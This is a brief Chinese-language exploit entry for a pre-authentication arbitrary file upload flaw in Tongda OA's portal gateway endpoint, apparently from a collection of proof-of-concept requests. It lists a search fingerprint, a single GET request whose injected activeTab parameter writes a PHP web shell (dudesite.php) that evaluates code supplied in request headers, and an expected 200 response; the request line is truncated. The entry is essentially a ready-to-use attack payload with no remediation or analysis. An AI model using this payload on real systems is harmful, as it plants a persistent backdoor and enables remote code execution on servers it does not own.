# 通达OAgateway前台任意文件上传漏洞

通达OA ｜ 文件上传 ｜ —
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%22dudesite.php%22,%22w+%22),%22%3C?php%20eval(next(getallheaders()));%22))%3b/*&id=266&module=Carouselimage HTT`
- **响应特征**：200